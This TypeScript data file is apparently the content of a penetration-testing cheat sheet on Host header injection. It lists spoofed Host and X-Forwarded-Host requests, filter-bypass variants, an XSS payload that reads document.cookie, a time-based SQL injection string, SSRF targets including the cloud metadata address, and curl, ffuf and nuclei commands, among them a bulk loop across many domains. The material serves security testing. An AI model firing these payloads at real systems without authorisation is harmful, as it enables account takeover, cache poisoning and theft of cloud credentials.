export interface HostHeaderInjectionCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const hostHeaderInjectionCategories: HostHeaderInjectionCategory[] = [
  // =================== VULNERABILITY DESCRIPTION ==================
  {
    category: "Vulnerability Description",
    commands: [
      {
        command: "Host Header Injection = web vulnerability when app trusts Host header without validation",
        description: "What is Host Header Injection?",
      },
      {
        command: "Attacker modifies Host header to make server believe it is handling a different domain",
        description: "Core mechanism of the attack",
      },
      {
        command: "Impacts: Cache Poisoning, Password Reset Poisoning, Open Redirects, Bypass security controls",
        description: "Primary impacts",
      },
      {
        command: "Severe cases: Full Account Takeover",
        description: "Most critical impact",
      },
    ],
  },

  // =================== COMMON TECHNIQUES ==================
  {
    category: "Common 1: Spoofing with Malicious Domain (Most Common)",
    commands: [
      {
        command: `GET /reset-password HTTP/1.1
Host: attacker.com`,
        description: "Purpose: Make the application generate links pointing to the attacker's server",
      },
    ],
  },
  {
    category: "Common 2: Adding a Prefix",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: attackertarget.com`,
        description: "Purpose: Bypass filters that only check for the main domain",
      },
    ],
  },
  {
    category: "Common 3: Absolute URL in Host",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: https://target.com/admin.php`,
        description: "Purpose: Trick URL generation and parsing logic",
      },
    ],
  },
  {
    category: "Common 4: Subdomain Bypass",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: subdomain.target.com`,
        description: "Purpose: Bypass simple validation that looks only for the main domain",
      },
    ],
  },
  {
    category: "Common 5: Leading Space / Tab",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
 Host: target.com`,
        description: "Purpose: Exploit parsing inconsistencies in servers or proxies",
      },
    ],
  },
  {
    category: "Common 6: Different Port",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: target.com:8080`,
        description: "Purpose: Bypass port-based access controls",
      },
    ],
  },
  {
    category: "Common 7: X-Forwarded-Host (Very Important)",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
X-Forwarded-Host: attacker.com`,
        description: "Purpose: Many apps/proxies trust X-Forwarded-Host over Host header",
      },
    ],
  },
  {
    category: "Common 8: Blank Host Header",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: `,
        description: "Purpose: Some servers default to first virtual host when Host is empty",
      },
    ],
  },
  {
    category: "Common 9: Multiple Host Headers",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: target.com
Host: attacker.com`,
        description: "Purpose: Exploit inconsistencies between frontend/backend parsing",
      },
    ],
  },
  {
    category: "Common 10: Using Server IP",
    commands: [
      {
        command: `GET /admin.php HTTP/1.1
Host: 192.0.2.1`,
        description: "Purpose: Bypass virtual host routing or access controls using IP",
      },
    ],
  },

  // =================== ADVANCED TECHNIQUES ==================
  {
    category: "Advanced 1: Special Characters & Null Byte",
    commands: [
      {
        command: `Host: target.com%00.attacker.com`,
        description: "Purpose: Bypass filters using null bytes or special characters",
      },
    ],
  },
  {
    category: "Advanced 2: Path Traversal in Host",
    commands: [
      {
        command: `Host: ../../attacker.com`,
        description: "Purpose: Exploit misconfigured apps that parse host as part of path",
      },
    ],
  },
  {
    category: "Advanced 3: Encoded Host",
    commands: [
      {
        command: `Host: %74%61%72%67%65%74.com`,
        description: "Purpose: Bypass validation using URL-encoded values",
      },
    ],
  },
  {
    category: "Advanced 4: XSS via X-Forwarded-Host",
    commands: [
      {
        command: `X-Forwarded-Host: evil.com"><img src=x onerror=prompt(document.cookie)>`,
        description: "Purpose: Inject XSS payload via X-Forwarded-Host header",
      },
    ],
  },
  {
    category: "Advanced 5: SQL Injection via X-Forwarded-Host",
    commands: [
      {
        command: `X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z`,
        description: "Purpose: Inject SQL payload via X-Forwarded-Host header",
      },
    ],
  },
  {
    category: "Advanced 6: SSRF via Host Header",
    commands: [
      {
        command: `Host: internal-service.local`,
        description: "Purpose: Reach internal services via Host header manipulation",
      },
      {
        command: "Target internal AWS metadata: Host: 169.254.169.254",
        description: "Use case: SSRF to cloud metadata services",
      },
    ],
  },

  // =================== TESTING TOOLS ==================
  {
    category: "Tool 1: cURL (Best for Manual Testing)",
    commands: [
      {
        command: `curl -I -H "Host: attacker.com" https://target.com`,
        description: "#1 Test Host header injection manually",
      },
      {
        command: `curl -I -H "X-Forwarded-Host: attacker.com" https://target.com`,
        description: "#2 Test X-Forwarded-Host injection manually",
      },
    ],
  },
  {
    category: "Tool 2: Ffuf (Brute Force Domains)",
    commands: [
      {
        command: `ffuf -u https://target.com -H "Host: FUZZ" -w hosts.txt -mc 200`,
        description: "Fuzz Host header values with wordlist, match 200 status",
      },
    ],
  },
  {
    category: "Tool 3: Nuclei (Automated Scanning)",
    commands: [
      {
        command: `nuclei -u https://target.com -t x-forwarded.yaml`,
        description: "Fast automated vulnerability scanning with Nuclei templates",
      },
      {
        command: "https://github.com/coffinxp/nuclei-templates/blob/main/x-forwarded.yaml",
        description: "CoffinXP Nuclei template for X-Forwarded-Host testing",
      },
    ],
  },
  {
    category: "Tool 4: Gau + Curl (Bulk Testing)",
    commands: [
      {
        command: `cat domains.txt | while read url; do echo "[*] Testing $url"; curl -sk -H "Host: attacker.com" "$url" -I; done`,
        description: "Test multiple domains with custom Host header in bulk",
      },
    ],
  },

  // =================== REAL-WORLD IMPACT ==================
  {
    category: "Real-World Impact",
    commands: [
      {
        command: "#1: Cache Poisoning → Affects all users",
        description: "Attackers poison shared cache to serve malicious content to all users",
      },
      {
        command: "#2: Password Reset Poisoning → Account theft",
        description: "Victim receives password reset link pointing to attacker's server",
      },
      {
        command: "#3: Open Redirects",
        description: "Abuse Host header to redirect users to phishing sites",
      },
      {
        command: "#4: Bypassing IP/Host-based Access Controls",
        description: "Access admin panels or internal APIs via Host header manipulation",
      },
      {
        command: "#5: SSRF to internal services",
        description: "Chain with SSRF to reach internal metadata services or APIs",
      },
      {
        command: "#6: XSS & SQLi in some cases",
        description: "Via header injection leading to injection vulnerabilities",
      },
    ],
  },

  // =================== VULNERABILITY TYPES CLASSIFICATION ==================
  {
    category: "Vulnerability Types Classification",
    commands: [
      {
        command: "Type: Basic Spoofing | Main Usage: Changing links & emails | Difficulty: Easy",
        description: "Entry level - Start here",
      },
      {
        command: "Type: Filter Bypass | Main Usage: Null byte, Encoding, Prefix | Difficulty: Medium",
        description: "Intermediate - When basic methods blocked",
      },
      {
        command: "Type: Header Smuggling | Main Usage: Multiple Host, Leading Space | Difficulty: Medium",
        description: "Intermediate - Exploit parsing inconsistencies",
      },
      {
        command: "Type: Advanced Attacks | Main Usage: SSRF, XSS, SQLi, DNS Rebinding | Difficulty: Advanced",
        description: "Expert level - Chain multiple techniques",
      },
    ],
  },

  // =================== PRACTICAL TIP ==================
  {
    category: "Practical Tip",
    commands: [
      {
        command: "Always start with Host and X-Forwarded-Host using attacker.com",
        description: "Step 1: Basic testing with common attacker domain",
      },
      {
        command: "If blocked, try bypass techniques (Null Byte, Encoding, Multiple Headers)",
        description: "Step 2: Apply filter evasion techniques when basic methods fail",
      },
    ],
  },
]

export const hostHeaderInjectionTools = [
  {
    name: "cURL",
    url: "https://curl.se/docs/",
    description: "Best tool for manual Host header injection testing",
  },
  {
    name: "Ffuf",
    url: "https://github.com/ffuf/ffuf",
    description: "Fast web fuzzer for brute-forcing Host header values",
  },
  {
    name: "Nuclei Templates",
    url: "https://github.com/coffinxp/nuclei-templates/blob/main/x-forwarded.yaml",
    description: "CoffinXP Nuclei template for X-Forwarded-Host testing",
  },
  {
    name: "Burp Suite",
    url: "https://portswigger.net/burp",
    description: "Professional web security testing with Host Header Injection scanner",
  },
  {
    name: "OWASP Testing Guide",
    url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection",
    description: "Official OWASP guide for testing Host Header Injection",
  },
]
